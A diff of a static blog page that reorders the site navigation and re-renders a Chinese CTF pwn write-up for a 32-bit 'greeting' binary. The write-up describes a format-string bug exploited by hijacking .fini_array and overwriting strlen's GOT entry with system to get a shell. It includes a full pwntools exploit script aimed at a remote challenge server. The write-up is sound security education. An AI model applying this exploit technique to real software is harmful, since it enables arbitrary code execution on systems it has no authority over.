@@ -247,9 +247,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/categories/">
               
-              关于
+              分类
               
               
             </a>
@@ -258,9 +258,9 @@
           
           
           <li>
-            <a href="/archive/">
+            <a href="/about/">
               
-              归档
+              关于
               
               
             </a>
@@ -280,9 +280,9 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/archive/">
               
-              分类
+              归档
               
               
             </a>
@@ -410,7 +410,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">616</span> In Total
+              Words <span class="post-count">625</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -472,9 +472,31 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="greeting_2.png" alt=""><br>开了canary和NX，没开reload和pie，考虑使用hijack got</p>
-<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p><img src="greeting_3.png" alt=""><br>可以看到一个明显的格式化字符串漏洞<br><img src="greeting_1.png" alt=""><br>测试得到偏移为12，这里需要注意的是我们的输入是跟在”Please tell me your name… “这句话的后头的，这句话本身长度为18，那么我们需要先输入两个字符使地址对齐，然后再用%p输出<br>但是这道题的格式化字符串漏洞是在return的时候，也就是说按照往常实现任意地址写一次就会退出<br>这里需要用到.fini_array劫持。是以前没接触过的新知识<br>关于这个fini_array的详细介绍可以参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/226003.html">这篇文章</a>，这位老哥语言比较诙谐但是内容写的挺不错<br>简单来讲就是main函数在退出到__libc_start_main之后还会有一个执行.fini_array的步骤，具体就是执行这一块地址的每一个函数指针<br>细说到main的执行流程，有一篇Patrick Horgan写的名字叫做”Linux x86 Program Start Up or - How the heck do we get to main()?”的文章：(<a target="_blank" rel="noopener" href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html</a>)<br>这里放一张很不错的流程图：<br><img src="greeting_4.png" alt=""><br>思路就是覆盖fini_array里面的函数指针为start，就可以做到回到main函数。<br>接下来就是需要思考怎么获取shell<br>程序给了system，没有后门函数，那么我们思路就是修改某个函数的got表为system，然后传递参数”/bin/sh”，这里注意到在程序的getnline这个函数里面有调用strlen<br><img src="greeting_5.png" alt=""><br>这个函数的参数和system一样是个字符串，因此我们考虑把strlen的got覆盖为system的plt<br>目前我们有strlen的got:0x08049A54,system的plt:0x08048490,.fini_array:0x08049934,start地址:0x080484F0<br>先覆盖strlen_got的高16位，覆盖成0x804，需要写入字符数的就是0x804-18-2-4=2020(D)，然后写入低16位，需要再写入的字符数是0x8490-0x804=31884(D),再写入fini_array，需要再写入0x84F0-0x8490=96(D)<br>第二次写入/bin/sh即可</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p=process(&quot;./greeting&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="string">&quot;54871&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./greeting&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">strlen_got=elf.got[<span class="string">&quot;strlen&quot;</span>]</span><br><span class="line">fini_array=<span class="number">0x08049934</span></span><br><span class="line">start=<span class="number">0x080484F0</span></span><br><span class="line">payload = <span class="string">b&#x27;AA&#x27;</span> + p32(strlen_got + <span class="number">2</span>) + p32(strlen_got) + p32(fini_array) + <span class="string">b&quot;%2020c&quot;</span> + <span class="string">b&quot;%12$hn&quot;</span> + <span class="string">b&quot;%31884c&quot;</span> + <span class="string">b&quot;%13$hn&quot;</span> + <span class="string">b&quot;%96c&quot;</span> + <span class="string">b&quot;%14$hn&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please tell me your name... &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please tell me your name... &quot;</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <h2 id="checksec">checksec</h2>
+<p><img src="greeting_2.png" alt=""><br>
+开了canary和NX，没开reload和pie，考虑使用hijack got</p>
+<h2 id="反编译">反编译</h2>
+<p><img src="greeting_3.png" alt=""><br>
+可以看到一个明显的格式化字符串漏洞<br>
+<img src="greeting_1.png" alt=""><br>
+测试得到偏移为12，这里需要注意的是我们的输入是跟在&quot;Please tell me your name… “这句话的后头的，这句话本身长度为18，那么我们需要先输入两个字符使地址对齐，然后再用%p输出<br>
+但是这道题的格式化字符串漏洞是在return的时候，也就是说按照往常实现任意地址写一次就会退出<br>
+这里需要用到.fini_array劫持。是以前没接触过的新知识<br>
+关于这个fini_array的详细介绍可以参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/226003.html">这篇文章</a>，这位老哥语言比较诙谐但是内容写的挺不错<br>
+简单来讲就是main函数在退出到__libc_start_main之后还会有一个执行.fini_array的步骤，具体就是执行这一块地址的每一个函数指针<br>
+细说到main的执行流程，有一篇Patrick Horgan写的名字叫做&quot;Linux x86 Program Start Up or - How the heck do we get to main()?“的文章：(<a target="_blank" rel="noopener" href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html</a>)<br>
+这里放一张很不错的流程图：<br>
+<img src="greeting_4.png" alt=""><br>
+思路就是覆盖fini_array里面的函数指针为start，就可以做到回到main函数。<br>
+接下来就是需要思考怎么获取shell<br>
+程序给了system，没有后门函数，那么我们思路就是修改某个函数的got表为system，然后传递参数”/bin/sh”，这里注意到在程序的getnline这个函数里面有调用strlen<br>
+<img src="greeting_5.png" alt=""><br>
+这个函数的参数和system一样是个字符串，因此我们考虑把strlen的got覆盖为system的plt<br>
+目前我们有strlen的got:0x08049A54,system的plt:0x08048490,.fini_array:0x08049934,start地址:0x080484F0<br>
+先覆盖strlen_got的高16位，覆盖成0x804，需要写入字符数的就是0x804-18-2-4=2020(D)，然后写入低16位，需要再写入的字符数是0x8490-0x804=31884(D),再写入fini_array，需要再写入0x84F0-0x8490=96(D)<br>
+第二次写入/bin/sh即可</p>
+<h2 id="exp">exp</h2>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#p=process(&quot;./greeting&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="string">&quot;54871&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./greeting&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">strlen_got=elf.got[<span class="string">&quot;strlen&quot;</span>]</span><br><span class="line">fini_array=<span class="number">0x08049934</span></span><br><span class="line">start=<span class="number">0x080484F0</span></span><br><span class="line">payload = <span class="string">b&#x27;AA&#x27;</span> + p32(strlen_got + <span class="number">2</span>) + p32(strlen_got) + p32(fini_array) + <span class="string">b&quot;%2020c&quot;</span> + <span class="string">b&quot;%12$hn&quot;</span> + <span class="string">b&quot;%31884c&quot;</span> + <span class="string">b&quot;%13$hn&quot;</span> + <span class="string">b&quot;%96c&quot;</span> + <span class="string">b&quot;%14$hn&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please tell me your name... &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please tell me your name... &quot;</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
         <hr>
